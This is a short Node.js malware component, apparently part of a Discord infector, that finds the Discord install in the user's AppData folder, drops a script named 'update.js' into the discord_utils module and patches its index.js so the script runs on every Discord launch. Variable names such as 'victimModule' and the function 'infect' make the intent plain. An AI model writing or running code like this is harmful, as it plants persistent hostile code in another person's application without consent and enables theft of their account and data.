const fs = require('fs');
const utils = require('./utils');
const discordPath = process.env.AppData + '/Discord';
const victimModule = 'discord_utils';
const scriptName = 'update.js';



const infect = async ()=>{
	if(!utils.assertArguments(3)) return false;
	if(!utils.assertPath(discordPath)) return false;
	const version = utils.findVersion(discordPath,'modules');
	if(!version) return false;
	const victimPath = `${discordPath}/${version}/modules/${victimModule}`;
	if(!(await utils.dropScript(victimPath + `/${scriptName}`,victimPath + '/cache.js',process.argv[2]))) return false;
	if(!utils.patchScript(victimPath + '/index.js',scriptName)) return false;
	console.log('Sucessfully patched Discord to load script on launch.');
}


module.exports = {
	infect
}
infect();
